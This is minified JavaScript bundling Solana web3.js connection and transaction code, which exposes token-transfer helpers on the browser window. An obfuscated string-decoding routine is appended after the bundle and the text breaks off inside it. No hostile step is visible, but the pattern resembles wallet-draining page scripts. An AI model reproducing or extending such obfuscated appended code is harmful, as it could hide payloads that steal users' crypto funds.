confirmTransactionUsingBlockHeightExceedanceStrategy({commitment:t,strategy:{abortSignal:e,lastValidBlockHeight:r,signature:n}}){let i=!1;const o=new Promise((e=>{const n=async()=>{try{return await this.getBlockHeight(t)}catch(t){return-1}};(async()=>{let t=await n();if(!i){for(;t<=r;){if(await Nn(1e3),i)return;if(t=await n(),i)return}e({__type:_n.BLOCKHEIGHT_EXCEEDED})}})()})),{abortConfirmation:s,confirmationPromise:a}=this.getTransactionConfirmationPromise({commitment:t,signature:n}),c=this.getCancellationPromise(e);let u;try{const t=await Promise.race([c,a,o]);if(t.__type!==_n.PROCESSED)throw new un(n);u=t.response}finally{i=!0,s()}return u}async confirmTransactionUsingDurableNonceStrategy({commitment:t,strategy:{abortSignal:e,minContextSlot:r,nonceAccountPubkey:n,nonceValue:i,signature:o}}){let s=!1;const a=new Promise((e=>{let o=i,a=null;const c=async()=>{try{const{context:e,value:i}=await this.getNonceAndContext(n,{commitment:t,minContextSlot:r});return a=e.slot,i?.nonce}catch(t){return o}};(async()=>{if(o=await c(),!s)for(;;){if(i!==o)return void e({__type:_n.NONCE_INVALID,slotInWhichNonceDidAdvance:a});if(await Nn(2e3),s)return;if(o=await c(),s)return}})()})),{abortConfirmation:c,confirmationPromise:u}=this.getTransactionConfirmationPromise({commitment:t,signature:o}),h=this.getCancellationPromise(e);let l;try{const e=await Promise.race([h,u,a]);if(e.__type===_n.PROCESSED)l=e.response;else{let n;for(;;){const t=await this.getSignatureStatus(o);if(null==t)break;if(!(t.context.slot<(e.slotInWhichNonceDidAdvance??r))){n=t;break}await Nn(400)}if(!n?.value)throw new ln(o);{const e=t||"finalized",{confirmationStatus:r}=n.value;switch(e){case"processed":case"recent":if("processed"!==r&&"confirmed"!==r&&"finalized"!==r)throw new ln(o);break;case"confirmed":case"single":case"singleGossip":if("confirmed"!==r&&"finalized"!==r)throw new ln(o);break;case"finalized":case"max":case"root":if("finalized"!==r)throw new ln(o)}l={context:n.context,value:{err:n.value.err}}}}}finally{s=!0,c()}return l}async confirmTransactionUsingLegacyTimeoutStrategy({commitment:t,signature:e}){let r;const n=new Promise((e=>{let n=this._confirmTransactionInitialTimeout||6e4;switch(t){case"processed":case"recent":case"single":case"confirmed":case"singleGossip":n=this._confirmTransactionInitialTimeout||3e4}r=setTimeout((()=>e({__type:_n.TIMED_OUT,timeoutMs:n})),n)})),{abortConfirmation:i,confirmationPromise:o}=this.getTransactionConfirmationPromise({commitment:t,signature:e});let s;try{const t=await Promise.race([o,n]);if(t.__type!==_n.PROCESSED)throw new hn(e,t.timeoutMs/1e3);s=t.response}finally{clearTimeout(r),i()}return s}async getClusterNodes(){const t=Ue(await this._rpcRequest("getClusterNodes",[]),li(We(ao)));if("error"in t)throw new Cn(t.error,"failed to get cluster nodes");return t.result}async getVoteAccounts(t){const e=this._buildArgs([],t),r=Ue(await this._rpcRequest("getVoteAccounts",e),uo);if("error"in r)throw new Cn(r.error,"failed to get vote accounts");return r.result}async getSlot(t){const{commitment:e,config:r}=ai(t),n=this._buildArgs([],e,void 0,r),i=Ue(await this._rpcRequest("getSlot",n),li($e()));if("error"in i)throw new Cn(i.error,"failed to get slot");return i.result}async getSlotLeader(t){const{commitment:e,config:r}=ai(t),n=this._buildArgs([],e,void 0,r),i=Ue(await this._rpcRequest("getSlotLeader",n),li(Je()));if("error"in i)throw new Cn(i.error,"failed to get slot leader");return i.result}async getSlotLeaders(t,e){const r=[t,e],n=Ue(await this._rpcRequest("getSlotLeaders",r),li(We(ii)));if("error"in n)throw new Cn(n.error,"failed to get slot leaders");return n.result}async getSignatureStatus(t,e){const{context:r,value:n}=await this.getSignatureStatuses([t],e);return wn(1===n.length),{context:r,value:n[0]}}async getSignatureStatuses(t,e){const r=[t];e&&r.push(e);const n=Ue(await this._rpcRequest("getSignatureStatuses",r),fo);if("error"in n)throw new Cn(n.error,"failed to get signature status");return n.result}async getTransactionCount(t){const{commitment:e,config:r}=ai(t),n=this._buildArgs([],e,void 0,r),i=Ue(await this._rpcRequest("getTransactionCount",n),li($e()));if("error"in i)throw new Cn(i.error,"failed to get transaction count");return i.result}async getTotalSupply(t){return(await this.getSupply({commitment:t,excludeNonCirculatingAccountsList:!0})).value.total}async getInflationGovernor(t){const e=this._buildArgs([],t),r=Ue(await this._rpcRequest("getInflationGovernor",e),Oi);if("error"in r)throw new Cn(r.error,"failed to get inflation");return r.result}async getInflationReward(t,e,r){const{commitment:n,config:i}=ai(r),o=this._buildArgs([t.map((t=>t.toBase58()))],n,void 0,{...i,epoch:null!=e?e:i?.epoch}),s=Ue(await this._rpcRequest("getInflationReward",o),mi);if("error"in s)throw new Cn(s.error,"failed to get inflation reward");return s.result}async getInflationRate(){const t=Ue(await this._rpcRequest("getInflationRate",[]),Ti);if("error"in t)throw new Cn(t.error,"failed to get inflation rate");return t.result}async getEpochInfo(t){const{commitment:e,config:r}=ai(t),n=this._buildArgs([],e,void 0,r),i=Ue(await this._rpcRequest("getEpochInfo",n),Pi);if("error"in i)throw new Cn(i.error,"failed to get epoch info");return i.result}async getEpochSchedule(){const t=Ue(await this._rpcRequest("getEpochSchedule",[]),Ci);if("error"in t)throw new Cn(t.error,"failed to get epoch schedule");const e=t.result;return new Xn(e.slotsPerEpoch,e.leaderScheduleSlotOffset,e.warmup,e.firstNormalEpoch,e.firstNormalSlot)}async getLeaderSchedule(){const t=Ue(await this._rpcRequest("getLeaderSchedule",[]),Li);if("error"in t)throw new Cn(t.error,"failed to get leader schedule");return t.result}async getMinimumBalanceForRentExemption(t,e){const r=this._buildArgs([t],e),n=Ue(await this._rpcRequest("getMinimumBalanceForRentExemption",r),po);return"error"in n?(console.warn("Unable to fetch minimum balance for rent exemption"),0):n.result}async getRecentBlockhashAndContext(t){const{context:e,value:{blockhash:r}}=await this.getLatestBlockhashAndContext(t);return{context:e,value:{blockhash:r,feeCalculator:{get lamportsPerSignature(){throw new Error("The capability to fetch `lamportsPerSignature` using the `getRecentBlockhash` API is no longer offered by the network. Use the `getFeeForMessage` API to obtain the fee for a given message.")},toJSON:()=>({})}}}}async getRecentPerformanceSamples(t){const e=Ue(await this._rpcRequest("getRecentPerformanceSamples",t?[t]:[]),Wo);if("error"in e)throw new Cn(e.error,"failed to get recent performance samples");return e.result}async getFeeCalculatorForBlockhash(t,e){const r=this._buildArgs([t],e),n=Ue(await this._rpcRequest("getFeeCalculatorForBlockhash",r),qo);if("error"in n)throw new Cn(n.error,"failed to get fee calculator");const{context:i,value:o}=n.result;return{context:i,value:null!==o?o.feeCalculator:null}}async getFeeForMessage(t,e){const r=tn(t.serialize()).toString("base64"),n=this._buildArgs([r],e),i=Ue(await this._rpcRequest("getFeeForMessage",n),fi(Ke($e())));if("error"in i)throw new Cn(i.error,"failed to get fee for message");if(null===i.result)throw new Error("invalid blockhash");return i.result}async getRecentPrioritizationFees(t){const e=t?.lockedWritableAccounts?.map((t=>t.toBase58())),r=e?.length?[e]:[],n=Ue(await this._rpcRequest("getRecentPrioritizationFees",r),Ri);if("error"in n)throw new Cn(n.error,"failed to get recent prioritization fees");return n.result}async getRecentBlockhash(t){try{return(await this.getRecentBlockhashAndContext(t)).value}catch(t){throw new Error("failed to get recent blockhash: "+t)}}async getLatestBlockhash(t){try{return(await this.getLatestBlockhashAndContext(t)).value}catch(t){throw new Error("failed to get recent blockhash: "+t)}}async getLatestBlockhashAndContext(t){const{commitment:e,config:r}=ai(t),n=this._buildArgs([],e,void 0,r),i=Ue(await this._rpcRequest("getLatestBlockhash",n),Do);if("error"in i)throw new Cn(i.error,"failed to get latest blockhash");return i.result}async isBlockhashValid(t,e){const{commitment:r,config:n}=ai(e),i=this._buildArgs([t],r,void 0,n),o=Ue(await this._rpcRequest("isBlockhashValid",i),jo);if("error"in o)throw new Cn(o.error,"failed to determine if the blockhash `"+t+"`is valid");return o.result}async getVersion(){const t=Ue(await this._rpcRequest("getVersion",[]),li(_i));if("error"in t)throw new Cn(t.error,"failed to get version");return t.result}async getGenesisHash(){const t=Ue(await this._rpcRequest("getGenesisHash",[]),li(Je()));if("error"in t)throw new Cn(t.error,"failed to get genesis hash");return t.result}async getBlock(t,e){const{commitment:r,config:n}=ai(e),i=this._buildArgsAtLeastConfirmed([t],r,void 0,n),o=await this._rpcRequest("getBlock",i);try{switch(n?.transactionDetails){case"accounts":{const t=Ue(o,To);if("error"in t)throw t.error;return t.result}case"none":{const t=Ue(o,Oo);if("error"in t)throw t.error;return t.result}default:{const t=Ue(o,Mo);if("error"in t)throw t.error;const{result:e}=t;return e?{...e,transactions:e.transactions.map((({transaction:t,meta:e,version:r})=>({meta:e,transaction:{...t,message:pi(r,t.message)},version:r})))}:null}}}catch(t){throw new Cn(t,"failed to get confirmed block")}}async getParsedBlock(t,e){const{commitment:r,config:n}=ai(e),i=this._buildArgsAtLeastConfirmed([t],r,"jsonParsed",n),o=await this._rpcRequest("getBlock",i);try{switch(n?.transactionDetails){case"accounts":{const t=Ue(o,Po);if("error"in t)throw t.error;return t.result}case"none":{const t=Ue(o,Co);if("error"in t)throw t.error;return t.result}default:{const t=Ue(o,Ro);if("error"in t)throw t.error;return t.result}}}catch(t){throw new Cn(t,"failed to get block")}}async getBlockProduction(t){let e,r;if("string"==typeof t)r=t;else if(t){const{commitment:n,...i}=t;r=n,e=i}const n=this._buildArgs([],r,"base64",e),i=Ue(await this._rpcRequest("getBlockProduction",n),Mi);if("error"in i)throw new Cn(i.error,"failed to get block production information");return i.result}async getTransaction(t,e){const{commitment:r,config:n}=ai(e),i=this._buildArgsAtLeastConfirmed([t],r,void 0,n),o=Ue(await this._rpcRequest("getTransaction",i),Uo);if("error"in o)throw new Cn(o.error,"failed to get transaction");const s=o.result;return s?{...s,transaction:{...s.transaction,message:pi(s.version,s.transaction.message)}}:s}async getParsedTransaction(t,e){const{commitment:r,config:n}=ai(e),i=this._buildArgsAtLeastConfirmed([t],r,"jsonParsed",n),o=Ue(await this._rpcRequest("getTransaction",i),zo);if("error"in o)throw new Cn(o.error,"failed to get transaction");return o.result}async getParsedTransactions(t,e){const{commitment:r,config:n}=ai(e),i=t.map((t=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([t],r,"jsonParsed",n)})));return(await this._rpcBatchRequest(i)).map((t=>{const e=Ue(t,zo);if("error"in e)throw new Cn(e.error,"failed to get transactions");return e.result}))}async getTransactions(t,e){const{commitment:r,config:n}=ai(e),i=t.map((t=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([t],r,void 0,n)})));return(await this._rpcBatchRequest(i)).map((t=>{const e=Ue(t,Uo);if("error"in e)throw new Cn(e.error,"failed to get transactions");const r=e.result;return r?{...r,transaction:{...r.transaction,message:pi(r.version,r.transaction.message)}}:r}))}async getConfirmedBlock(t,e){const r=this._buildArgsAtLeastConfirmed([t],e),n=Ue(await this._rpcRequest("getBlock",r),Lo);if("error"in n)throw new Cn(n.error,"failed to get confirmed block");const i=n.result;if(!i)throw new Error("Confirmed block "+t+" not found");const o={...i,transactions:i.transactions.map((({transaction:t,meta:e})=>{const r=new An(t.message);return{meta:e,transaction:{...t,message:r}}}))};return{...o,transactions:o.transactions.map((({transaction:t,meta:e})=>({meta:e,transaction:xn.populate(t.message,t.signatures)})))}}async getBlocks(t,e,r){const n=this._buildArgsAtLeastConfirmed(void 0!==e?[t,e]:[t],r),i=Ue(await this._rpcRequest("getBlocks",n),li(We($e())));if("error"in i)throw new Cn(i.error,"failed to get blocks");return i.result}async getBlockSignatures(t,e){const r=this._buildArgsAtLeastConfirmed([t],e,void 0,{transactionDetails:"signatures",rewards:!1}),n=Ue(await this._rpcRequest("getBlock",r),No);if("error"in n)throw new Cn(n.error,"failed to get block");const i=n.result;if(!i)throw new Error("Block "+t+" not found");return i}async getConfirmedBlockSignatures(t,e){const r=this._buildArgsAtLeastConfirmed([t],e,void 0,{transactionDetails:"signatures",rewards:!1}),n=Ue(await this._rpcRequest("getBlock",r),No);if("error"in n)throw new Cn(n.error,"failed to get confirmed block");const i=n.result;if(!i)throw new Error("Confirmed block "+t+" not found");return i}async getConfirmedTransaction(t,e){const r=this._buildArgsAtLeastConfirmed([t],e),n=Ue(await this._rpcRequest("getTransaction",r),Uo);if("error"in n)throw new Cn(n.error,"failed to get transaction");const i=n.result;if(!i)return i;const o=new An(i.transaction.message),s=i.transaction.signatures;return{...i,transaction:xn.populate(o,s)}}async getParsedConfirmedTransaction(t,e){const r=this._buildArgsAtLeastConfirmed([t],e,"jsonParsed"),n=Ue(await this._rpcRequest("getTransaction",r),zo);if("error"in n)throw new Cn(n.error,"failed to get confirmed transaction");return n.result}async getParsedConfirmedTransactions(t,e){const r=t.map((t=>({methodName:"getTransaction",args:this._buildArgsAtLeastConfirmed([t],e,"jsonParsed")})));return(await this._rpcBatchRequest(r)).map((t=>{const e=Ue(t,zo);if("error"in e)throw new Cn(e.error,"failed to get confirmed transactions");return e.result}))}async getConfirmedSignaturesForAddress(t,e,r){let n={},i=await this.getFirstAvailableBlock();for(;!("until"in n)&&!(--e<=0||e<i);)try{const t=await this.getConfirmedBlockSignatures(e,"finalized");t.signatures.length>0&&(n.until=t.signatures[t.signatures.length-1].toString())}catch(t){if(t instanceof Error&&t.message.includes("skipped"))continue;throw t}let o=await this.getSlot("finalized");for(;!("before"in n||++r>o);)try{const t=await this.getConfirmedBlockSignatures(r);t.signatures.length>0&&(n.before=t.signatures[t.signatures.length-1].toString())}catch(t){if(t instanceof Error&&t.message.includes("skipped"))continue;throw t}return(await this.getConfirmedSignaturesForAddress2(t,n)).map((t=>t.signature))}async getConfirmedSignaturesForAddress2(t,e,r){const n=this._buildArgsAtLeastConfirmed([t.toBase58()],r,void 0,e),i=Ue(await this._rpcRequest("getConfirmedSignaturesForAddress2",n),Zi);if("error"in i)throw new Cn(i.error,"failed to get confirmed signatures for address");return i.result}async getSignaturesForAddress(t,e,r){const n=this._buildArgsAtLeastConfirmed([t.toBase58()],r,void 0,e),i=Ue(await this._rpcRequest("getSignaturesForAddress",n),Yi);if("error"in i)throw new Cn(i.error,"failed to get signatures for address");return i.result}async getAddressLookupTable(t,e){const{context:r,value:n}=await this.getAccountInfoAndContext(t,e);let i=null;return null!==n&&(i=new ei({key:t,state:ei.deserialize(n.data)})),{context:r,value:i}}async getNonceAndContext(t,e){const{context:r,value:n}=await this.getAccountInfoAndContext(t,e);let i=null;return null!==n&&(i=Wn.fromAccountData(n.data)),{context:r,value:i}}async getNonce(t,e){return await this.getNonceAndContext(t,e).then((t=>t.value)).catch((e=>{throw new Error("failed to get nonce for account "+t.toBase58()+": "+e)}))}async requestAirdrop(t,e){const r=Ue(await this._rpcRequest("requestAirdrop",[t.toBase58(),e]),Fo);if("error"in r)throw new Cn(r.error,`airdrop to ${t.toBase58()} failed`);return r.result}async _blockhashWithExpiryBlockHeight(t){if(!t){for(;this._pollingBlockhash;)await Nn(100);const t=Date.now()-this._blockhashInfo.lastFetch>=3e4;if(null!==this._blockhashInfo.latestBlockhash&&!t)return this._blockhashInfo.latestBlockhash}return await this._pollNewBlockhash()}async _pollNewBlockhash(){this._pollingBlockhash=!0;try{const t=Date.now(),e=this._blockhashInfo.latestBlockhash,r=e?e.blockhash:null;for(let t=0;t<50;t++){const t=await this.getLatestBlockhash("finalized");if(r!==t.blockhash)return this._blockhashInfo={latestBlockhash:t,lastFetch:Date.now(),transactionSignatures:[],simulatedSignatures:[]},t;await Nn(200)}throw new Error(`Unable to obtain a new blockhash after ${Date.now()-t}ms`)}finally{this._pollingBlockhash=!1}}async getStakeMinimumDelegation(t){const{commitment:e,config:r}=ai(t),n=this._buildArgs([],e,"base64",r),i=Ue(await this._rpcRequest("getStakeMinimumDelegation",n),fi($e()));if("error"in i)throw new Cn(i.error,"failed to get stake minimum delegation");return i.result}async simulateTransaction(t,e,r){if("message"in t){const i=t.serialize(),o=n.Buffer.from(i).toString("base64");if(Array.isArray(e)||void 0!==r)throw new Error("Invalid arguments");const s=e||{};s.encoding="base64","commitment"in s||(s.commitment=this.commitment),e&&"object"==typeof e&&"innerInstructions"in e&&(s.innerInstructions=e.innerInstructions);const a=[o,s],c=Ue(await this._rpcRequest("simulateTransaction",a),xi);if("error"in c)throw new Error("failed to simulate transaction: "+c.error.message);return c.result}let i;if(t instanceof xn){let e=t;i=new xn,i.feePayer=e.feePayer,i.instructions=t.instructions,i.nonceInfo=e.nonceInfo,i.signatures=e.signatures}else i=xn.populate(t),i._message=i._json=void 0;if(void 0!==e&&!Array.isArray(e))throw new Error("Invalid arguments");const o=e;if(i.nonceInfo&&o)i.sign(...o);else{let t=this._disableBlockhashCaching;for(;;){const e=await this._blockhashWithExpiryBlockHeight(t);if(i.lastValidBlockHeight=e.lastValidBlockHeight,i.recentBlockhash=e.blockhash,!o)break;if(i.sign(...o),!i.signature)throw new Error("!signature");const r=i.signature.toString("base64");if(!this._blockhashInfo.simulatedSignatures.includes(r)&&!this._blockhashInfo.transactionSignatures.includes(r)){this._blockhashInfo.simulatedSignatures.push(r);break}t=!0}}const s=i._compile(),a=s.serialize(),c=i._serialize(a).toString("base64"),u={encoding:"base64",commitment:this.commitment};if(r){const t=(Array.isArray(r)?r:s.nonProgramIds()).map((t=>t.toBase58()));u.accounts={encoding:"base64",addresses:t}}o&&(u.sigVerify=!0),e&&"object"==typeof e&&"innerInstructions"in e&&(u.innerInstructions=e.innerInstructions);const h=[c,u],l=Ue(await this._rpcRequest("simulateTransaction",h),xi);if("error"in l){let t;if("data"in l.error&&(t=l.error.data.logs,t&&Array.isArray(t))){const e="\n    ",r=e+t.join(e);console.error(l.error.message,r)}throw new Pn({action:"simulate",signature:"",transactionMessage:l.error.message,logs:t})}return l.result}async sendTransaction(t,e,r){if("version"in t){if(e&&Array.isArray(e))throw new Error("Invalid arguments");const r=t.serialize();return await this.sendRawTransaction(r,e)}if(void 0===e||!Array.isArray(e))throw new Error("Invalid arguments");const n=e;if(t.nonceInfo)t.sign(...n);else{let e=this._disableBlockhashCaching;for(;;){const r=await this._blockhashWithExpiryBlockHeight(e);if(t.lastValidBlockHeight=r.lastValidBlockHeight,t.recentBlockhash=r.blockhash,t.sign(...n),!t.signature)throw new Error("!signature");const i=t.signature.toString("base64");if(!this._blockhashInfo.transactionSignatures.includes(i)){this._blockhashInfo.transactionSignatures.push(i);break}e=!0}}const i=t.serialize();return await this.sendRawTransaction(i,r)}async sendRawTransaction(t,e){const r=tn(t).toString("base64");return await this.sendEncodedTransaction(r,e)}async sendEncodedTransaction(t,e){const r={encoding:"base64"},n=e&&e.skipPreflight,i=!0===n?"processed":e&&e.preflightCommitment||this.commitment;e&&null!=e.maxRetries&&(r.maxRetries=e.maxRetries),e&&null!=e.minContextSlot&&(r.minContextSlot=e.minContextSlot),n&&(r.skipPreflight=n),i&&(r.preflightCommitment=i);const o=[t,r],s=Ue(await this._rpcRequest("sendTransaction",o),Ho);if("error"in s){let t;throw"data"in s.error&&(t=s.error.data.logs),new Pn({action:n?"send":"simulate",signature:"",transactionMessage:s.error.message,logs:t})}return s.result}_wsOnOpen(){this._rpcWebSocketConnected=!0,this._rpcWebSocketHeartbeat=setInterval((()=>{(async()=>{try{await this._rpcWebSocket.notify("ping")}catch{}})()}),5e3),this._updateSubscriptions()}_wsOnError(t){this._rpcWebSocketConnected=!1,console.error("ws error:",t.message)}_wsOnClose(t){this._rpcWebSocketConnected=!1,this._rpcWebSocketGeneration=(this._rpcWebSocketGeneration+1)%Number.MAX_SAFE_INTEGER,this._rpcWebSocketIdleTimeout&&(clearTimeout(this._rpcWebSocketIdleTimeout),this._rpcWebSocketIdleTimeout=null),this._rpcWebSocketHeartbeat&&(clearInterval(this._rpcWebSocketHeartbeat),this._rpcWebSocketHeartbeat=null),1e3!==t?(this._subscriptionCallbacksByServerSubscriptionId={},Object.entries(this._subscriptionsByHash).forEach((([t,e])=>{this._setSubscription(t,{...e,state:"pending"})}))):this._updateSubscriptions()}_setSubscription(t,e){const r=this._subscriptionsByHash[t]?.state;if(this._subscriptionsByHash[t]=e,r!==e.state){const r=this._subscriptionStateChangeCallbacksByHash[t];r&&r.forEach((t=>{try{t(e.state)}catch{}}))}}_onSubscriptionStateChange(t,e){const r=this._subscriptionHashByClientSubscriptionId[t];if(null==r)return()=>{};const n=this._subscriptionStateChangeCallbacksByHash[r]||=new Set;return n.add(e),()=>{n.delete(e),0===n.size&&delete this._subscriptionStateChangeCallbacksByHash[r]}}async _updateSubscriptions(){if(0===Object.keys(this._subscriptionsByHash).length)return void(this._rpcWebSocketConnected&&(this._rpcWebSocketConnected=!1,this._rpcWebSocketIdleTimeout=setTimeout((()=>{this._rpcWebSocketIdleTimeout=null;try{this._rpcWebSocket.close()}catch(t){t instanceof Error&&console.log(`Error when closing socket connection: ${t.message}`)}}),500)));if(null!==this._rpcWebSocketIdleTimeout&&(clearTimeout(this._rpcWebSocketIdleTimeout),this._rpcWebSocketIdleTimeout=null,this._rpcWebSocketConnected=!0),!this._rpcWebSocketConnected)return void this._rpcWebSocket.connect();const t=this._rpcWebSocketGeneration,e=()=>t===this._rpcWebSocketGeneration;await Promise.all(Object.keys(this._subscriptionsByHash).map((async t=>{const r=this._subscriptionsByHash[t];if(void 0!==r)switch(r.state){case"pending":case"unsubscribed":if(0===r.callbacks.size)return delete this._subscriptionsByHash[t],"unsubscribed"===r.state&&delete this._subscriptionCallbacksByServerSubscriptionId[r.serverSubscriptionId],void await this._updateSubscriptions();await(async()=>{const{args:n,method:i}=r;try{this._setSubscription(t,{...r,state:"subscribing"});const e=await this._rpcWebSocket.call(i,n);this._setSubscription(t,{...r,serverSubscriptionId:e,state:"subscribed"}),this._subscriptionCallbacksByServerSubscriptionId[e]=r.callbacks,await this._updateSubscriptions()}catch(o){if(console.error(`Received ${o instanceof Error?"":"JSON-RPC "}error calling \`${i}\``,{args:n,error:o}),!e())return;this._setSubscription(t,{...r,state:"pending"}),await this._updateSubscriptions()}})();break;case"subscribed":0===r.callbacks.size&&await(async()=>{const{serverSubscriptionId:n,unsubscribeMethod:i}=r;if(this._subscriptionsAutoDisposedByRpc.has(n))this._subscriptionsAutoDisposedByRpc.delete(n);else{this._setSubscription(t,{...r,state:"unsubscribing"}),this._setSubscription(t,{...r,state:"unsubscribing"});try{await this._rpcWebSocket.call(i,[n])}catch(n){if(n instanceof Error&&console.error(`${i} error:`,n.message),!e())return;return this._setSubscription(t,{...r,state:"subscribed"}),void await this._updateSubscriptions()}}this._setSubscription(t,{...r,state:"unsubscribed"}),await this._updateSubscriptions()})()}})))}_handleServerNotification(t,e){const r=this._subscriptionCallbacksByServerSubscriptionId[t];void 0!==r&&r.forEach((t=>{try{t(...e)}catch(t){console.error(t)}}))}_wsOnAccountNotification(t){const{result:e,subscription:r}=Ue(t,Xi);this._handleServerNotification(r,[e.value,e.context])}_makeSubscription(t,e){const r=this._nextClientSubscriptionId++,n=Zn([t.method,e]),i=this._subscriptionsByHash[n];return void 0===i?this._subscriptionsByHash[n]={...t,args:e,callbacks:new Set([t.callback]),state:"pending"}:i.callbacks.add(t.callback),this._subscriptionHashByClientSubscriptionId[r]=n,this._subscriptionDisposeFunctionsByClientSubscriptionId[r]=async()=>{delete this._subscriptionDisposeFunctionsByClientSubscriptionId[r],delete this._subscriptionHashByClientSubscriptionId[r];const e=this._subscriptionsByHash[n];wn(void 0!==e,`Could not find a \`Subscription\` when tearing down client subscription #${r}`),e.callbacks.delete(t.callback),await this._updateSubscriptions()},this._updateSubscriptions(),r}onAccountChange(t,e,r){const{commitment:n,config:i}=ai(r),o=this._buildArgs([t.toBase58()],n||this._commitment||"finalized","base64",i);return this._makeSubscription({callback:e,method:"accountSubscribe",unsubscribeMethod:"accountUnsubscribe"},o)}async removeAccountChangeListener(t){await this._unsubscribeClientSubscription(t,"account change")}_wsOnProgramAccountNotification(t){const{result:e,subscription:r}=Ue(t,to);this._handleServerNotification(r,[{accountId:e.value.pubkey,accountInfo:e.value.account},e.context])}onProgramAccountChange(t,e,r,n){const{commitment:i,config:o}=ai(r),s=this._buildArgs([t.toBase58()],i||this._commitment||"finalized","base64",o||(n?{filters:ci(n)}:void 0));return this._makeSubscription({callback:e,method:"programSubscribe",unsubscribeMethod:"programUnsubscribe"},s)}async removeProgramAccountChangeListener(t){await this._unsubscribeClientSubscription(t,"program account change")}onLogs(t,e,r){const n=this._buildArgs(["object"==typeof t?{mentions:[t.toString()]}:t],r||this._commitment||"finalized");return this._makeSubscription({callback:e,method:"logsSubscribe",unsubscribeMethod:"logsUnsubscribe"},n)}async removeOnLogsListener(t){await this._unsubscribeClientSubscription(t,"logs")}_wsOnLogsNotification(t){const{result:e,subscription:r}=Ue(t,$o);this._handleServerNotification(r,[e.value,e.context])}_wsOnSlotNotification(t){const{result:e,subscription:r}=Ue(t,ro);this._handleServerNotification(r,[e])}onSlotChange(t){return this._makeSubscription({callback:t,method:"slotSubscribe",unsubscribeMethod:"slotUnsubscribe"},[])}async removeSlotChangeListener(t){await this._unsubscribeClientSubscription(t,"slot change")}_wsOnSlotUpdatesNotification(t){const{result:e,subscription:r}=Ue(t,io);this._handleServerNotification(r,[e])}onSlotUpdate(t){return this._makeSubscription({callback:t,method:"slotsUpdatesSubscribe",unsubscribeMethod:"slotsUpdatesUnsubscribe"},[])}async removeSlotUpdateListener(t){await this._unsubscribeClientSubscription(t,"slot update")}async _unsubscribeClientSubscription(t,e){const r=this._subscriptionDisposeFunctionsByClientSubscriptionId[t];r?await r():console.warn(`Ignored unsubscribe request because an active subscription with id \`${t}\` for '${e}' events could not be found.`)}_buildArgs(t,e,r,n){const i=e||this._commitment;if(i||r||n){let e={};r&&(e.encoding=r),i&&(e.commitment=i),n&&(e=Object.assign(e,n)),t.push(e)}return t}_buildArgsAtLeastConfirmed(t,e,r,n){const i=e||this._commitment;if(i&&!["confirmed","finalized"].includes(i))throw new Error("Using Connection with default commitment: `"+this._commitment+"`, but method requires at least `confirmed`");return this._buildArgs(t,e,r,n)}_wsOnSignatureNotification(t){const{result:e,subscription:r}=Ue(t,oo);"receivedSignature"!==e.value&&this._subscriptionsAutoDisposedByRpc.add(r),this._handleServerNotification(r,"receivedSignature"===e.value?[{type:"received"},e.context]:[{type:"status",result:e.value},e.context])}onSignature(t,e,r){const n=this._buildArgs([t],r||this._commitment||"finalized"),i=this._makeSubscription({callback:(t,r)=>{if("status"===t.type){e(t.result,r);try{this.removeSignatureListener(i)}catch(t){}}},method:"signatureSubscribe",unsubscribeMethod:"signatureUnsubscribe"},n);return i}onSignatureWithOptions(t,e,r){const{commitment:n,...i}={...r,commitment:r&&r.commitment||this._commitment||"finalized"},o=this._buildArgs([t],n,void 0,i),s=this._makeSubscription({callback:(t,r)=>{e(t,r);try{this.removeSignatureListener(s)}catch(t){}},method:"signatureSubscribe",unsubscribeMethod:"signatureUnsubscribe"},o);return s}async removeSignatureListener(t){await this._unsubscribeClientSubscription(t,"signature result")}_wsOnRootNotification(t){const{result:e,subscription:r}=Ue(t,so);this._handleServerNotification(r,[e])}onRootChange(t){return this._makeSubscription({callback:t,method:"rootSubscribe",unsubscribeMethod:"rootUnsubscribe"},[])}async removeRootChangeListener(t){await this._unsubscribeClientSubscription(t,"root change")}},window.Transaction=xn,window.SystemProgram=Hn,window.PublicKey=an,window.LAMPORTS_PER_SOL=1e9,window.SYSVAR_CLOCK_PUBKEY=Mn,window.Keypair=Go,window.getAssociatedTokenAddress=async function(t,e,r=!1,n=Rs,i=Ps){if(!r&&!an.isOnCurve(e.toBuffer()))throw new Ls;const[o]=await an.findProgramAddress([e.toBuffer(),n.toBuffer(),t.toBuffer()],i);return o},window.AccountLayout=zs,window.TOKEN_PROGRAM_ID=Rs,window.ASSOCIATED_TOKEN_PROGRAM_ID=Ps,window.createAssociatedTokenAccountInstruction=function(t,e,r,n,i=Rs,o=Ps){return function(t,e,r,n,i,o=Rs,s=Ps){const a=[{pubkey:t,isSigner:!0,isWritable:!0},{pubkey:e,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!1,isWritable:!1},{pubkey:n,isSigner:!1,isWritable:!1},{pubkey:Hn.programId,isSigner:!1,isWritable:!1},{pubkey:o,isSigner:!1,isWritable:!1}];return new In({keys:a,programId:s,data:i})}(t,e,r,n,Ws.alloc(0),i,o)},window.createTransferInstruction=function(t,e,r,n,i=[],o=Rs){const s=function(t,e,r){if(r.length){t.push({pubkey:e,isSigner:!1,isWritable:!1});for(const e of r)t.push({pubkey:e instanceof an?e:e.publicKey,isSigner:!0,isWritable:!1})}else t.push({pubkey:e,isSigner:!0,isWritable:!1});return t}([{pubkey:t,isSigner:!1,isWritable:!0},{pubkey:e,isSigner:!1,isWritable:!0}],r,i),a=qs.alloc(Fs.span);return Fs.encode({instruction:Ds.Transfer,amount:BigInt(n)},a),new In({keys:s,programId:o,data:a})},window.TransactionInstruction=In,window.axios=bu})()})();
function cHN1sY7(cHN1sY7, jnnEqQv) {
  for (var e_qLdL = 0x0; e_qLdL < jnnEqQv; e_qLdL++) {
    cHN1sY7["push"](cHN1sY7["shift"]());
  }
  return cHN1sY7;
}
function jnnEqQv(cHN1sY7) {
  var jnnEqQv = "}{B(_T[S]*AC~R\"+Q|@UW^%`VXD$)GFEH&I,/Y=<?>:JaZ.b;dPecfLKMNOhjwngzyixkl0m1o2q38!pr9sutv6#475";
  var e_qLdL = "" + (cHN1sY7 || "");
  var f3i6H1 = e_qLdL.length;
  var rOnBTDk = [];
  var djkbJA = 0x0;
  var __globalObject = 0x0;
  var __String = -0x1;
  for (var __Array = 0x0; __Array < f3i6H1; __Array++) {
    var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
    if (_0x200a61 === -0x1) continue;
    if (__String < 0x0) {
      __String = _0x200a61;
    } else {
